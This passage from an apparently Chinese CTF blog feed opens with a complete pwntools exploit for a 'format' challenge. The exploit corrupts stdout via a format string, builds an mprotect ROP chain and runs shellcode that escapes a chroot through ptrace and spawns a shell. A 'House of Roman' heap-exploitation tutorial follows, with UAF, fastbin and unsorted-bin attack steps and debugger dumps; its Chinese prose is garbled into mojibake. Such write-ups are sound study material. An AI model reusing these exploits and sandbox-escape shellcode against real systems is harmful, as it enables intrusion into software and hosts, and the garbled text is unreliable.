class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from mypwn import *</span></span><br><span class="line"><span class="comment"># from zio import *</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;strace -f -o aa.txt ./format&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = zio(target)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">interact</span>(<span class="params">io</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_recv</span>():</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                output = io.read_until_timeout(timeout=<span class="number">1</span>)</span><br><span class="line">                <span class="comment"># print output</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    t1 = Thread(target=run_recv)</span><br><span class="line">    t1.start()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = raw_input()</span><br><span class="line">        <span class="keyword">if</span> d != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            io.writeline(d)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./format&#x27;</span>)</span><br><span class="line">stdout=<span class="number">0x6CC300</span></span><br><span class="line"></span><br><span class="line">f=FormatStr(isx64=<span class="number">1</span>,autosort=<span class="literal">False</span>)</span><br><span class="line">f[stdout+<span class="number">0xa0</span>]=stdout</span><br><span class="line">f[stdout+<span class="number">0x98</span>]=stdout+<span class="number">0x30</span></span><br><span class="line">f[stdout+<span class="number">0x50</span>]=<span class="number">0x400BD0</span> <span class="comment"># input function</span></span><br><span class="line">f.dword(stdout+<span class="number">0xd8</span>,<span class="number">0x4BF780</span><span class="number">-0x38</span>)</span><br><span class="line"><span class="comment"># gdb attach `ps -aux|grep ./format$|awk &#x27;&#123;print $2&#125;&#x27;|sort -r`</span></span><br><span class="line">raw_input(<span class="string">&#x27;wait to debug&#x27;</span>)</span><br><span class="line">p.writeline(f.payload(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Now we are able to modify the whole struct of stdout.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> p.waitfor(<span class="string">&#x27;Receiving all data&#x27;</span>) <span class="keyword">as</span> h:</span><br><span class="line">    <span class="keyword">with</span> p.local(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> p.recv():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this is going to modify the page protection</span></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload+=p64(stdout+<span class="number">0x68</span>) <span class="comment"># new stack</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x44ad50</span>) <span class="comment"># xchg eax, esp ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x442fa9</span>) <span class="comment"># pop rdx ; pop rsi</span></span><br><span class="line">payload+=p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4006b5</span>) <span class="comment">#pop rdi</span></span><br><span class="line">payload+=p64(stdout&amp;<span class="number">0xfffff000</span>)</span><br><span class="line">payload+=p64(<span class="number">0x400644</span>) <span class="comment">#add rsp, 0x10 ; pop rbx ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(stdout<span class="number">-0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4405F0</span>) <span class="comment">#mprotect</span></span><br><span class="line">payload+=p64(stdout+<span class="number">0xc0</span>) <span class="comment"># shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now we can execute our shellcode.</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xorr9d, r9d</span></span><br><span class="line"><span class="string">    xoredi, edi</span></span><br><span class="line"><span class="string">    mov r8d, 0xFFFFFFFF</span></span><br><span class="line"><span class="string">    movecx, 0x22</span></span><br><span class="line"><span class="string">    movedx, 7</span></span><br><span class="line"><span class="string">    movesi, 0x4000</span></span><br><span class="line"><span class="string">    mov rax, 0x440510</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi,rax</span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    mov rdx,0x4000</span></span><br><span class="line"><span class="string">    mov rax,rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&#x27;wait to debug&#x27;</span>)</span><br><span class="line">p.writeline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass the chroot via ptrace</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xorr9d, r9d</span></span><br><span class="line"><span class="string">    xoredi, edi</span></span><br><span class="line"><span class="string">    mov r8d, 0xFFFFFFFF</span></span><br><span class="line"><span class="string">    movecx, 0x22</span></span><br><span class="line"><span class="string">    movedx, 3</span></span><br><span class="line"><span class="string">    movesi, 0x4000</span></span><br><span class="line"><span class="string">    mov rax, 0x440510</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string">    mov rbp,rax</span></span><br><span class="line"><span class="string">    add rax,0x3f00</span></span><br><span class="line"><span class="string">    mov rsp,rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    mov al,110</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov r15,rax</span></span><br><span class="line"><span class="string">    mov rsi,rax</span></span><br><span class="line"><span class="string">    mov di,0x10</span></span><br><span class="line"><span class="string">    xor r10,r10</span></span><br><span class="line"><span class="string">    mov rdx,r10</span></span><br><span class="line"><span class="string">    call ptrace</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    mov rdi,r15</span></span><br><span class="line"><span class="string">    call wait</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    call getaddr</span></span><br><span class="line"><span class="string">    xor r12,r12</span></span><br><span class="line"><span class="string">    mov rbx,r12</span></span><br><span class="line"><span class="string">    mov rdx,0x43EFC0</span></span><br><span class="line"><span class="string">    mov r14,rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">write:</span></span><br><span class="line"><span class="string">    mov rdi,5</span></span><br><span class="line"><span class="string">    mov r10,qword ptr [r14]</span></span><br><span class="line"><span class="string">    mov rsi,r15</span></span><br><span class="line"><span class="string">    call ptrace</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    inc r12</span></span><br><span class="line"><span class="string">    cmp r12,5</span></span><br><span class="line"><span class="string">    add rdx,8</span></span><br><span class="line"><span class="string">    add r14,8</span></span><br><span class="line"><span class="string">    jnz write</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov di,17</span></span><br><span class="line"><span class="string">    mov rsi,r15</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    mov r10,rdx</span></span><br><span class="line"><span class="string">    call ptrace</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov al,60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">ptrace:</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    mov al,0x65</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wait:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor     r10d, r10d</span></span><br><span class="line"><span class="string">    movsxd  rdx, edx</span></span><br><span class="line"><span class="string">    movsxd  rdi, edi</span></span><br><span class="line"><span class="string">    mov     eax, 0x3D</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">getaddr:</span></span><br><span class="line"><span class="string">    lea rax,[rip+1]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>+shellcraft.amd64.linux.sh())</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&#x27;wait to debug&#x27;</span>)</span><br><span class="line">p.writeline(shellcode.ljust(<span class="number">0x4000</span>,<span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.interact()</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> t3sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of Roman</title>
      <link href="house_of_roman.html"/>
      <url>house_of_roman.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>House of Roman è¿™ä¸ªæŠ€å·§è¯´ç®€å•ç‚¹å…¶å®å°±æ˜¯ fastbin attack å’Œ Unsortbin attachk ç»“åˆçš„ä¸€ä¸ªå° trickã€‚</p><h2 id="æ¦‚æ‹¬"><a href="#æ¦‚æ‹¬" class="headerlink" title="æ¦‚æ‹¬"></a>æ¦‚æ‹¬</h2><p>è¯¥æŠ€æœ¯ç”¨äº bypass ALSRï¼Œåˆ©ç”¨12-bit çš„çˆ†ç ´æ¥è¾¾åˆ°è·å–shellçš„ç›®çš„ã€‚ä¸”ä»…ä»…åªéœ€è¦ä¸€ä¸ª UAF æ¼æ´ä»¥åŠèƒ½åˆ›å»ºä»»æ„å¤§å°çš„ chunk çš„æƒ…å†µä¸‹å°±èƒ½å®Œæˆåˆ©ç”¨ã€‚</p><h2 id="åŸç†ä»¥åŠå±•ç¤º"><a href="#åŸç†ä»¥åŠå±•ç¤º" class="headerlink" title="åŸç†ä»¥åŠå±•ç¤º"></a>åŸç†ä»¥åŠå±•ç¤º</h2><p>ä½œè€…æä¾›ç»™äº†æˆ‘ä»¬ä¸€ä¸ª demo ç”¨äºå±•ç¤ºï¼Œæ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹å¤§æ¦‚å¯ä»¥åˆ†ä¸ºä¸‰æ­¥éª¤ã€‚</p><ol><li>å°† FD æŒ‡å‘ malloc_hook</li><li>ä¿®æ­£ 0x71 çš„ Freelist</li><li>å¾€ malloc_hook å†™å…¥ one gadget</li></ol><p>å…ˆå¯¹ demo è¿›è¡Œä¸€ä¸ªå¤§è‡´çš„åˆ†æï¼š</p><p>å¼€å¯çš„ä¿æŠ¤æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>æ ·é¢˜ä¸­æœ‰ä¸‰ä¸ªä¸»è¦åŠŸèƒ½ï¼ŒMalloc ï¼ŒWriteï¼Œä»¥åŠ Freeã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    v5 = malloc_chunk(<span class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    write_chunk(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Free&quot;</span>);</span><br><span class="line">    free_chunk();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>åœ¨ Free åŠŸèƒ½ä¸­å­˜åœ¨ æŒ‡é’ˆæœªç½®é›¶è€Œé€ æˆçš„æ‚¬æŒ‚æŒ‡é’ˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_chunk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter index :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x13</span> )</span><br><span class="line">    <span class="built_in">free</span>(heap_ptrs[(<span class="keyword">unsigned</span> __int64)v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¸€æ­¥"><a href="#ç¬¬ä¸€æ­¥" class="headerlink" title="ç¬¬ä¸€æ­¥"></a>ç¬¬ä¸€æ­¥</h3><p>é¦–å…ˆä¼ªé€ ä¸€ä¸ª chunk  ï¼Œchunkçš„å¤§å°ä¸º0x61ã€‚ç´§æ¥ç€æˆ‘ä»¬åˆ©ç”¨ partial overwriteÂ å°† FD æŒ‡å‘ä¼ªé€ çš„chunkï¼ˆå½“ç„¶ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ UAF å®Œæˆï¼‰ã€‚</p><p>ä¼ªé€  chunk size</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;</span><br><span class="line">0x555555757050: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757060: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757070: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757080: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757090: 0x41414141      0x41414141      0x61    0x0     &lt;----------</span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œæˆ‘ä»¬ free æ‰ chunk 1ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬èƒ½è·å¾—ä¸€ä¸ª unsortbin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x555555757020 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0xd1,</span><br><span class="line">  fd &#x3D; 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  bk &#x3D; 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize &#x3D; 0x4141414141414141,</span><br><span class="line">  bk_nextsize &#x3D; 0x4141414141414141</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€ï¼Œæˆ‘ä»¬é‡åˆ†é… 0xd1 è¿™å— chunkï¼Œä»¥åŠä¿®æ”¹å…¶ size ä¸º0x71</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40ag 0x555555757020</span><br><span class="line">0x555555757020: 0x4141414141414141      0x71</span><br><span class="line">0x555555757030: 0x7ffff7dd1b58 &lt;main_arena+88&gt;  0x7ffff7dd1b58 &lt;main_arena+88&gt;</span><br><span class="line">0x555555757040: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757050: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757060: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757070: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757080: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757090: 0x4141414141414141      0x61</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç´§æ¥ç€éœ€è¦ä¿®æ­£è¿™0x71 FD freelist ï¼Œå°†å…¶ä¼ªé€ æˆå·²ç»é‡Šæ”¾çš„å—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40ag 0x555555757000</span><br><span class="line">0x555555757000: 0x0     0x21</span><br><span class="line">0x555555757010: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757020: 0x4141414141414141      0x71       &lt;----------  free 0x71</span><br><span class="line">0x555555757030: 0x7ffff7dd1b58 &lt;main_arena+88&gt;  0x7ffff7dd1b58 &lt;main_arena+88&gt;</span><br><span class="line">0x555555757040: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757050: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757060: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757070: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757080: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757090: 0x4141414141414141      0x61</span><br><span class="line">0x5555557570a0: 0x0     0x0</span><br><span class="line">0x5555557570b0: 0x0     0x0</span><br><span class="line">0x5555557570c0: 0x0     0x0</span><br><span class="line">0x5555557570d0: 0x0     0x0</span><br><span class="line">0x5555557570e0: 0x0     0x0</span><br><span class="line">0x5555557570f0: 0xd0    0x71   &lt;----------     free 0x71</span><br><span class="line">0x555555757100: 0x0     0x0</span><br><span class="line">0x555555757110: 0x0     0x0</span><br><span class="line">0x555555757120: 0x0     0x0</span><br><span class="line">0x555555757130: 0x0     0x0</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc : 0x7ffff7a23d28 (&quot;malloc_hook&quot;)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„ FD å·²ç»åœ¨ malloc hook é™„è¿‘ï¼Œæœªä¹‹åçš„çˆ†ç ´åšå‡†å¤‡ã€‚</p><h3 id="ç¬¬äºŒæ­¥"><a href="#ç¬¬äºŒæ­¥" class="headerlink" title="ç¬¬äºŒæ­¥"></a>ç¬¬äºŒæ­¥</h3><p>æˆ‘ä»¬åªéœ€è¦é€šè¿‡ é‡Šæ”¾ä¸€å—0x71å¤§å°çš„ chunk å°±èƒ½å®Œæˆ fixã€‚</p><h3 id="ç¬¬ä¸‰æ­¥"><a href="#ç¬¬ä¸‰æ­¥" class="headerlink" title="ç¬¬ä¸‰æ­¥"></a>ç¬¬ä¸‰æ­¥</h3><p>åˆ©ç”¨ unsortebin çš„æ”»å‡»æŠ€å·§ï¼Œå¹¶ä½¿ç”¨ç¼–è¾‘åŠŸèƒ½å°† onegadet å†™å…¥    ã€‚</p><h2 id="åˆ†æ-exp"><a href="#åˆ†æ-exp" class="headerlink" title="åˆ†æ exp"></a>åˆ†æ exp</h2><p>åˆ†é…Â <code>3</code>Â ä¸ªÂ <code>chunk</code>Â ï¼Œåœ¨Â <code>B + 0x78</code>Â å¤„è®¾ç½®Â <code>p64(0x61)</code>Â ï¼Œ ä½œç”¨æ˜¯Â <code>fake size</code>Â ,ç”¨äºåé¢ çš„Â <code>fastbin attack</code></p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) <span class="comment"># 0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># d0</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">2</span>)  <span class="comment"># 0x70</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;create 2 chunk, 0x20, 0xd8&quot;</span>)</span><br><span class="line">fake = <span class="string">&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)  <span class="comment">## fake size</span></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line">info(<span class="string">&quot;fake&quot;</span>)</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾æ‰Â <code>B</code>Â , ç„¶ååˆ†é…åŒæ ·å¤§å°å†æ¬¡åˆ†é…åˆ°Â <code>B</code>Â , æ­¤æ—¶Â <code>B+0x10</code>Â å’ŒÂ <code>B+0x18</code>Â ä¸­æœ‰Â <code>main_arean</code>Â çš„åœ°å€ã€‚åˆ†é…Â <code>3</code>Â ä¸ªÂ <code>fastbin</code>Â ï¼Œåˆ©ç”¨Â <code>off by one</code>Â ä¿®æ”¹Â <code>B-&gt;size = 0x71</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free(1)</span><br><span class="line">create(0xc8,1)</span><br><span class="line"></span><br><span class="line">create(0x65,3)  # b</span><br><span class="line">create(0x65,15)</span><br><span class="line">create(0x65,18)</span><br><span class="line"></span><br><span class="line">over &#x3D; &quot;A&quot;*0x18  # off by one</span><br><span class="line">over +&#x3D; &quot;\x71&quot;  # set chunk  1&#39;s size --&gt; 0x71</span><br><span class="line">edit(0,over)</span><br><span 